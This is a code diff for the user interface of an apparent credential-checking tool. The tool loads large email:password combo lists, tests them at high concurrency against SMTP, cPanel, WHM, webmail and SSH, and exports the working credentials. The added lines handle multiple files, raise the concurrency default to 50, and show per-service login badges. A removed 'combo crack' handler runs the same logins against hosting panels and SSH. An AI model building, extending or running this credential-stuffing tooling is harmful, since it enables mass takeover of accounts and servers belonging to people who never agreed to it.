@@ -50,56 +50,63 @@ const credsInput = $('#creds-input');
 // loading its (hundreds of MB of) text into this textarea and parsing it on the
 // UI thread. `loadedFile` holds that selection; typing in the box cancels it so
 // the pasted text takes over again.
-let loadedFile = null; // { path, name, count, errors } or null
+let loadedFiles = []; // Array of { path, name, count, parsedPath }
 
 credsInput.addEventListener('input', () => {
-  loadedFile = null;
+  loadedFiles = [];
   refreshParse();
   refreshResumeButton();
 });
 
 $('#file-input').addEventListener('change', async (e) => {
-  const file = e.target.files[0];
-  if (!file) return;
-  const path = api.getFilePath?.(file);
-  if (!path) {
-    // No filesystem path available — fall back to reading it into the textarea.
-    readFileIntoTextarea(file);
-    return;
-  }
-  loadedFile = null;
-  $('#parse-count').textContent = `Reading ${file.name}…`;
+  const files = Array.from(e.target.files);
+  if (!files.length) return;
+  
+  loadedFiles = [];
+  let totalCount = 0;
+  const errors = [];
+  
+  $('#parse-count').textContent = 'Reading ' + files.length + ' file(s)…';
   $('#parse-errors').textContent = '';
-  let res;
-  try {
-    res = await api.countFile(path);
-  } catch (err) {
-    $('#parse-errors').textContent = `Could not read file: ${err.message}`;
+  
+  for (const file of files) {
+    if (file.size > 5 * 1024 * 1024) {
+      errors.push(file.name + ' exceeds 5MB limit');
+      continue;
+    }
+    const path = api.getFilePath?.(file);
+    if (!path) {
+      errors.push(file.name + ': path unavailable');
+      continue;
+    }
+    
+    try {
+      const res = await api.countFile(path);
+      if (!res.count) {
+        errors.push(file.name + ': no valid credentials');
+        continue;
+      }
+      loadedFiles.push({ path, name: file.name, count: res.count, parsedPath: res.parsedPath });
+      totalCount += res.count;
+    } catch (err) {
+      errors.push(file.name + ': ' + err.message);
+    }
+  }
+  
+  if (!loadedFiles.length) {
+    $('#parse-count').textContent = 'No valid files loaded';
+    $('#parse-errors').textContent = errors.join(' | ');
     return;
   }
-  // Nothing parsed as delimited credentials — likely a labeled-block or small
-  // file. Fall back to the paste path, which handles those formats.
-  if (!res.count) {
-    readFileIntoTextarea(file);
-    return;
-  }
-  loadedFile = { path, name: file.name, count: res.count, errors: res.errors, parsedPath: res.parsedPath };
-  credsInput.value = ''; // setting .value programmatically does not fire 'input'
-  const sample = (res.sample || [])
-    .map((c) => c.user)
-    .filter(Boolean)
-    .slice(0, 2)
-    .join(', ');
-  $('#parse-count').textContent =
-    `${res.count.toLocaleString()} credentials from ${file.name}${sample ? ` (e.g. ${sample})` : ''}`;
-  $('#parse-errors').textContent = res.errors
-    ? `${res.errors.toLocaleString()} line${res.errors === 1 ? '' : 's'} skipped`
-    : '';
+  
+  credsInput.value = '';
+  $('#parse-count').textContent = loadedFiles.length + ' file(s) — ' + totalCount.toLocaleString() + ' total credentials';
+  $('#parse-errors').textContent = errors.length ? errors.join(' | ') : '';
   refreshResumeButton();
 });
 
 function readFileIntoTextarea(file) {
-  loadedFile = null;
+  loadedFiles = [];
   if (file.size > MAX_INLINE_BYTES) {
     $('#parse-count').textContent = `${file.name} is too large to open here (${Math.round(file.size / 1e6)} MB).`;
     $('#parse-errors').textContent =
@@ -136,7 +143,11 @@ function refreshParse() {
 
 // ---------- Run / cancel ----------
 $('#btn-run').addEventListener('click', runBatch);
-$('#btn-cancel').addEventListener('click', () => api.cancel());
+$('#btn-cancel').addEventListener('click', () => {
+  $('#btn-cancel').textContent = 'Cancelling...';
+  $('#btn-cancel').disabled = true;
+  api.cancel();
+});
 
 function buildRunOpts() {
   const manualRecipients = $('#manual-recipients').value
@@ -145,7 +156,7 @@ function buildRunOpts() {
     .filter(Boolean);
 
   return {
-    concurrency: Number($('#opt-concurrency').value) || 5,
+    concurrency: Number($('#opt-concurrency').value) || 50,
     maxPerSec: Math.max(0, Number($('#opt-maxrate').value) || 0),
     // Honest backpressure: when the server returns a rate-limit response, every
     // worker waits this long before starting another test.
@@ -162,7 +173,9 @@ function buildRunOpts() {
       ? { authRecords: true, dnsbl: true, spamScore: true }
       : null,
     proxyConfig: settings?.proxy,
-    retries: 1,
+    protocols: $('#opt-protocols')?.value || 'smtp',
+    maxCandidates: 2,
+    retries: 0,
     retryBackoffMs: 2000,
   };
 }
@@ -179,7 +192,7 @@ function startRunUI() {
 async function runBatch() {
   if (running) return;
   // A file selection streams from disk; a pasted list tests the parsed records.
-  if (loadedFile) return runFileBatch();
+  if (loadedFiles.length > 0) return runFileBatch();
 
   refreshParse();
   if (!parsed.records.length) {
@@ -189,6 +202,11 @@ async function runBatch() {
   startRunUI();
 
   const { records: creds, removed } = dedupeCredentials(parsed.records);
+  
+  if (creds.length > 2000) {
+    $('#parse-errors').textContent = 'Warning: Testing a large pasted list may freeze the UI for a minute while it sends data. For fast processing, save it as a .txt file and use "Load File" instead.';
+  }
+
   runTotal = creds.length;
   if (removed) {
     $('#parse-errors').textContent = `${removed} duplicate${removed === 1 ? '' : 's'} removed — testing ${creds.length}.`;
@@ -206,27 +224,32 @@ async function runBatch() {
   }
 }
 
-async function runFileBatch(resume = false) {
+async function runFileBatch(isResume = false) {
+  if (loadedFiles.length === 0) return;
   startRunUI();
-  runTotal = loadedFile.count; // already deduped during the count pass
-  if (resume) {
-    // Seed the display with what the prior run already finished; new results
-    // accumulate on top, and the main process skips already-tested credentials.
+  
+  runTotal = loadedFiles.reduce((sum, f) => sum + f.count, 0);
+  
+  if (isResume) {
     const prior = await api.runProgress();
     counts = { ...prior.counts };
     testedCount = prior.total;
     renderSummary();
   }
-  $('#progress-label').textContent = `${testedCount} / ${runTotal}`;
-
+  $('#progress-label').textContent = testedCount + ' / ' + runTotal;
+  
   try {
-    // Prefer the deduped copy written during the count pass — it streams without
-    // rebuilding the key Set. Fall back to the raw file if it isn't available.
-    const runPath = loadedFile.parsedPath || loadedFile.path;
-    const preDeduped = !!loadedFile.parsedPath;
-    await api.testBatchFile(runPath, settings?.seeds || [], buildRunOpts(), resume, preDeduped);
+    let first = true;
+    for (const f of loadedFiles) {
+      if (!running) break;
+      const runPath = f.parsedPath || f.path;
+      const preDeduped = !!f.parsedPath;
+      const resumeFlag = (first && !isResume) ? false : true;
+      await api.testBatchFile(runPath, settings?.seeds || [], buildRunOpts(), resumeFlag, preDeduped);
+      first = false;
+    }
   } catch (err) {
-    $('#parse-errors').textContent = `Run failed: ${err.message}`;
+    $('#parse-errors').textContent = 'Run failed: ' + err.message;
   } finally {
     setRunning(false);
     running = false;
@@ -238,7 +261,7 @@ async function runFileBatch(resume = false) {
 async function refreshResumeButton() {
   const btn = $('#btn-resume');
   if (!btn) return;
-  if (running || !loadedFile) {
+  if (running || loadedFiles.length === 0) {
     btn.hidden = true;
     return;
   }
@@ -255,12 +278,15 @@ $('#btn-resume').addEventListener('click', () => {
 function setRunning(on) {
   $('#btn-run').disabled = on;
   $('#btn-cancel').disabled = !on;
+  if (!on) $('#btn-cancel').textContent = 'Cancel';
   const noResults = testedCount === 0;
   $('#btn-export-csv').disabled = on || noResults;
   $('#btn-export-json').disabled = on || noResults;
   // TXT export holds only working (non-dead) credentials.
   const working = testedCount - (counts.dead || 0);
   $('#btn-export-txt').disabled = on || working <= 0;
+  const pe = $('#btn-export-protocols');
+  if (pe) pe.disabled = on || testedCount === 0;
 }
 
 // Cap how many rows live in the DOM so very large runs stay snappy. Counts come
@@ -418,6 +444,17 @@ function rowHtml(r) {
     );
   }
 
+  if (r.panels) {
+    const p = r.panels;
+    const b = (k, v) => {
+      if (!v) return '';
+      if (v.error) return '<span class="dbadge b-bad" title="' + esc(v.error) + '">' + k + '!</span>';
+      if (v.valid) return '<span class="dbadge b-ok">' + k + '✓</span>';
+      if (v.reachable === false) return '<span class="dbadge b-neutral">' + k + '-</span>';
+      return '<span class="dbadge b-bad">' + k + '✗</span>';
+    };
+    parts.push('<span class="badges">' + b('CP', p.cpanel) + ' ' + b('WM', p.webmail) + ' ' + b('WHM', p.whm) + ' ' + b('SSH', p.ssh) + '</span>');
+  }
   const deliv = deliverabilityBadges(r);
   if (deliv) parts.push(deliv);
   const seedAuth = (r.perSeed || [])
@@ -481,6 +518,14 @@ function authBadges(a) {
 $('#btn-export-txt').addEventListener('click', () => doExport('txt'));
 $('#btn-export-csv').addEventListener('click', () => doExport('csv'));
 $('#btn-export-json').addEventListener('click', () => doExport('json'));
+$('#btn-export-protocols')?.addEventListener('click', async () => {
+  const res = await api.exportByProtocol();
+  if (res.error) {
+    $('#progress-label').textContent = 'Export failed: ' + res.error;
+  } else {
+    $('#progress-label').textContent = 'Saved ' + res.count + ' files to ' + res.folder;
+  }
+});
 async function doExport(format) {
   const res = await api.exportRun(format);
   if (res.saved) $('#progress-label').textContent = `Saved to ${res.path}`;
@@ -997,101 +1042,6 @@ function comboRenderRow(r) {
     '<td class="notes">' + esc(notes.join('; ')) + '</td>' +
     '</tr>';
 }
-
-$('#btn-combo-crack').addEventListener('click', async () => {
-  const out = $('#combo-results-body');
-  const prog = $('#combo-progress');
-  const statusEl = $('#combo-status');
-  const btn = $('#btn-combo-crack');
-  const mode = $('#combo-mode')?.value || 'smtp';
-  const concurrency = Math.max(1, Number($('#combo-concurrency')?.value) || 50);
-  const timeoutSec = Math.max(2, Number($('#combo-timeout')?.value) || 5);
-  const useMxFilter = $('#combo-mx-filter')?.checked !== false;
-  let records = parse($('#combo-input').value).records;
-
-  if (!records.length) {
-    out.innerHTML = '<tr><td colspan="7" class="empty-row">Paste at least one email:password line.</td></tr>';
-    return;
-  }
-
-  btn.disabled = true;
-  out.innerHTML = '';
-  prog.textContent = '0 / ' + records.length;
-  statusEl.textContent = 'Starting ' + mode + ' mode (concurrency ' + concurrency + ', timeout ' + timeoutSec + 's)…';
-  const t0 = Date.now();
-  const CHUNK_SIZE = 100;
-
-  try {
-    if (useMxFilter && (mode === 'smtp' || mode === 'all') && typeof api.mxResolve === 'function') {
-      statusEl.textContent = 'Resolving MX for ' + records.length + ' combos…';
-      const domains = [...new Set(records.map((r) => comboDeriveHost(r)).filter(Boolean))];
-      const mx = await api.mxResolve(domains).then((r) => r.mx || {}).catch(() => ({}));
-      const before = records.length;
-      records = records.filter((r) => { const h = comboDeriveHost(r); return !h || mx[h] !== false; });
-      const skipped = before - records.length;
-      prog.textContent = '0 / ' + records.length;
-      if (skipped > 0) statusEl.textContent = 'MX filter skipped ' + skipped + ' dead-domain combos. Running ' + records.length + '…';
-    }
-
-    const total = records.length;
-    for (let i = 0; i < total; i += CHUNK_SIZE) {
-      const chunk = records.slice(i, i + CHUNK_SIZE);
-
-      if (mode === 'smtp' || mode === 'all') {
-        const smtpCreds = chunk.map((r) => ({ user: r.user, pass: r.pass, host: r.host || null, port: r.port || 587 }));
-        const off = api.onComboProgress((r) => {
-          out.insertAdjacentHTML('beforeend', comboRenderRow({
-            user: r.cred?.user || '?', host: comboDeriveHost(r.cred || {}), smtp: r,
-          }));
-          while (out.children.length > 2000) out.removeChild(out.firstElementChild);
-        });
-        await api.checkSmtp(smtpCreds, {
-          concurrency, maxPerSec: 0,
-          connectTimeout: timeoutSec * 1000, sendTimeout: timeoutSec * 1000,
-        }).catch((e) => console.error('smtp chunk error', e));
-        if (off) off();
-      }
-
-      if (mode === 'panels' || mode === 'all') {
-        const panelTargets = chunk.map((r) => ({ host: comboDeriveHost(r), user: r.user, pass: r.pass })).filter((t) => t.host);
-        if (panelTargets.length > 0) {
-          const settled = await Promise.allSettled([
-            api.checkCpanel(panelTargets, { concurrency, port: 2083, timeout: timeoutSec * 1000 }),
-            api.checkWebmail(panelTargets, { concurrency, port: 443, path: '/webmail', timeout: timeoutSec * 1000 }),
-            api.checkWhm(panelTargets, { concurrency, port: 2087, timeout: timeoutSec * 1000 }),
-            api.checkSsh(panelTargets, { concurrency, port: 22, timeout: timeoutSec * 1000 }),
-          ]);
-          const byHost = new Map();
-          const keys = ['cpanel', 'webmail', 'whm', 'ssh'];
-          settled.forEach((s, idx) => {
-            if (s.status !== 'fulfilled' || !s.value?.results) return;
-            s.value.results.forEach((r) => {
-              const cur = byHost.get(r.host) || {};
-              cur[keys[idx]] = r;
-              byHost.set(r.host, cur);
-            });
-          });
-          chunk.forEach((r) => {
-            const h = comboDeriveHost(r);
-            const p = byHost.get(h) || {};
-            out.insertAdjacentHTML('beforeend', comboRenderRow({ user: r.user, host: h, cpanel: p.cpanel, webmail: p.webmail, whm: p.whm, ssh: p.ssh }));
-          });
-        }
-      }
-
-      while (out.children.length > 2000) out.removeChild(out.firstElementChild);
-      prog.textContent = Math.min(i + chunk.length, total) + ' / ' + total;
-      await new Promise((res) => setTimeout(res, 0));
-    }
-
-    const elapsed = Math.round((Date.now() - t0) / 1000);
-    statusEl.textContent = 'Completed ' + total + ' combos in ' + elapsed + 's (' + mode + ' mode).';
-  } catch (err) {
-    statusEl.textContent = 'Error: ' + err.message;
-  } finally {
-    btn.disabled = false;
-  }
-});
 
 // ---------- Email authentication check ----------
 function authBadge(label, verdict) {
